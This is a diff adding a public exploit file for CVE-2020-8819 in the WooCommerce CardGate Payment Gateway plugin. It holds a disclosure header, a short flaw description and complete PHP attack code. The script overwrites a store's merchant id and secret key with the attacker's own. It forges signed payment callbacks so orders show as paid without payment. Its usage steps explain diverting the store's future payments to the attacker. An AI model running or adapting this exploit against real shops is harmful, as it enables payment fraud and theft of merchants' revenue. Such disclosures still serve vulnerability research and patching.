@@ -1,0 +1,174 @@
+# Exploit Title: WordPress Plugin WooCommerce CardGate Payment Gateway 3.1.15 - Payment Process Bypass
+# Discovery Date: 2020-02-02
+# Public Disclosure Date: 2020-02-22
+# Exploit Author: GeekHack
+# Vendor Homepage: https://www.cardgate.com (www.curopayments.com)
+# Software Link: https://github.com/cardgate/woocommerce/releases/tag/v3.1.15
+# Version: <= 3.1.15
+# Tested on: WordPress 5.3.2 + WooCommerce 3.9.1 + CardGate Payment Gateway Plugin 3.1.15
+# CVE: CVE-2020-8819
+
+<?php
+/*
+  Description:
+
+  Lack of origin authentication (CWE-346) at IPN callback processing function allow (even unauthorized) attacker to remotely replace critical plugin settings (merchant id, secret key etc) with known to him and therefore bypass payment process (eg. spoof order status by manually sending IPN callback request with a valid signature but without real payment) and/or receive all subsequent payments (on behalf of the store).
+
+  [code ref: https://github.com/cardgate/woocommerce/blob/f2111af7b1a3fd701c1c5916137f3ac09482feeb/cardgate/cardgate.php#L426-L442]
+*/
+
+/*
+  Usage:
+
+  1. Change values of the constants (see below for TARGET & ORDER)
+  2. Host this script somewhere (must be public accessible)
+  3. Register a merchant at https://cardgate.com
+  4. Sign into "My CardGate" dashboard
+  5. Add fake site or choose existing one
+  6. Click "Setup your Webshop" button in site preferences
+  7. Paste the URL of this script into the pop-up window and click "Save"
+  8. The target store now uses the settings of your site, enjoy :]
+
+  P.S. It works perfectly in both Staging and Live modes, regardless of the current mode of the target shop.
+*/
+
+// -------- Options (start) --------
+define('TARGET', 'http://domain.tld'); // without trailing slash, pls
+define('ORDER', 0); // provide non-zero value to automagically spoof order status
+// --------- Options (end) ---------
+
+define('API_STAGING', 'https://secure-staging.curopayments.net/rest/v1/curo/');
+define('API_PRODUCTION', 'https://secure.curopayments.net/rest/v1/curo/');
+
+/**
+ * Original function from CardGate API client library (SDK) with minor changes
+ * @param string $sToken_ 
+ * @param bool $bTestmode_ 
+ * @return string
+ */
+function pullConfig($sToken_, $bTestmode_ = FALSE) {
+	if (!is_string($sToken_)) {
+		throw new Exception('invalid token for settings pull: ' . $sToken_);
+	}
+
+	$sResource = "pullconfig/{$sToken_}/";
+	$sUrl = ($bTestmode_ ? API_STAGING : API_PRODUCTION) . $sResource;
+
+	$rCh = curl_init();
+	curl_setopt($rCh, CURLOPT_URL, $sUrl);
+	curl_setopt($rCh, CURLOPT_RETURNTRANSFER, 1);
+	curl_setopt($rCh, CURLOPT_TIMEOUT, 60);
+	curl_setopt($rCh, CURLOPT_HEADER, FALSE);
+	curl_setopt($rCh, CURLOPT_HTTPHEADER, [
+		'Content-Type: application/json',
+		'Accept: application/json'
+	]);
+	if ($bTestmode_) {
+		curl_setopt($rCh, CURLOPT_SSL_VERIFYPEER, FALSE);
+		curl_setopt($rCh, CURLOPT_SSL_VERIFYHOST, 0);
+	} else {
+		curl_setopt($rCh, CURLOPT_SSL_VERIFYPEER, TRUE);
+		curl_setopt($rCh, CURLOPT_SSL_VERIFYHOST, 2);
+	}
+
+	if (FALSE == ($sResults = curl_exec($rCh))) {
+		$sError = curl_error($rCh);
+		curl_close($rCh);
+		throw new Exception('Client.Request.Curl.Error: ' . $sError);
+	} else {
+		curl_close($rCh);
+	}
+	if (NULL === ($aResults = json_decode($sResults, TRUE))) {
+		throw new Exception('remote gave invalid JSON: ' . $sResults);
+	}
+	if (isset($aResults['error'])) {
+		throw new Exception($aResults['error']['message']);
+	}
+
+	return $aResults;
+}
+
+/**
+ * Original function from CardGate API client library (SDK) with minor changes
+ * @param string $sUrl 
+ * @param array $aData_ 
+ * @param string $sHttpMethod_ 
+ * @return string
+ */
+function doRequest($sUrl, $aData_ = NULL, $sHttpMethod_ = 'POST') {
+	if (!in_array($sHttpMethod_, ['GET', 'POST'])) {
+		throw new Exception('invalid http method: ' . $sHttpMethod_);
+	}
+
+	$rCh = curl_init();
+	curl_setopt($rCh, CURLOPT_RETURNTRANSFER, 1);
+	curl_setopt($rCh, CURLOPT_TIMEOUT, 60);
+	curl_setopt($rCh, CURLOPT_HEADER, FALSE);
+	curl_setopt($rCh, CURLOPT_SSL_VERIFYPEER, FALSE);
+	curl_setopt($rCh, CURLOPT_SSL_VERIFYHOST, 0);
+
+	if ('POST' == $sHttpMethod_) {
+		curl_setopt($rCh, CURLOPT_URL, $sUrl);
+		curl_setopt($rCh, CURLOPT_POST, TRUE);
+		curl_setopt($rCh, CURLOPT_POSTFIELDS, http_build_query($aData_));
+	} else {
+		$sUrl = $sUrl
+			. (FALSE === strchr($sUrl, '?') ? '?' : '&')
+			. http_build_query($aData_)
+		;
+		curl_setopt($rCh, CURLOPT_URL, $sUrl);
+	}
+
+	$response = curl_exec($rCh);
+	if (FALSE == $response) {
+		$sError = curl_error($rCh);
+		curl_close($rCh);
+		throw new Exception('Client.Request.Curl.Error: ' . $sError);
+	} else {
+		curl_close($rCh);
+	}
+
+	return $response;
+}
+
+if (!empty($_REQUEST['cgp_sitesetup']) && !empty($_REQUEST['token'])) {
+	try {
+		$aResult = pullConfig($_REQUEST['token'], $_REQUEST['testmode']);
+		$aConfigData = $aResult['pullconfig']['content'];
+		$response = doRequest(TARGET, $_REQUEST);
+		if ($response == $aConfigData['merchant'] . '.' . $aConfigData['site_id'] . '.200') {
+			if (ORDER) {
+				$payload = [
+					'testmode' => $_REQUEST['testmode'],
+					'reference' => random_int(10000000000, 99999999999) . ORDER,
+					'transaction' => 'T' . str_pad(time(), 11, random_int(0, 9)),
+					'currency' => '',
+					'amount' => 0,
+					'status' => 'success',
+					'code' => 200
+				];
+				$payload['hash'] = md5(
+					(!empty($payload['testmode']) ? 'TEST' : '')
+					. $payload['transaction']
+					. $payload['currency']
+					. $payload['amount']
+					. $payload['reference']
+					. $payload['code']
+					. $aConfigData['site_key']
+				);
+				$response = doRequest(TARGET . '/?cgp_notify=true', $payload);
+				if ($response == $payload['transaction'] . '.' . $payload['code']) {
+					die($aConfigData['merchant'] . '.' . $aConfigData['site_id'] . '.200');
+				} else {
+					throw new Exception("Unable to spoof order status, but merchant settings was updated successfully ($response)");	
+				}
+			} else {
+				die($aConfigData['merchant'] . '.' . $aConfigData['site_id'] . '.200');
+			}
+		} else {
+			throw new Exception("It seems target is not vulnerable ($response)");
+		}
+	} catch (\Exception $oException_) {
+		die(htmlspecialchars($oException_->getMessage()));
+	}
+}
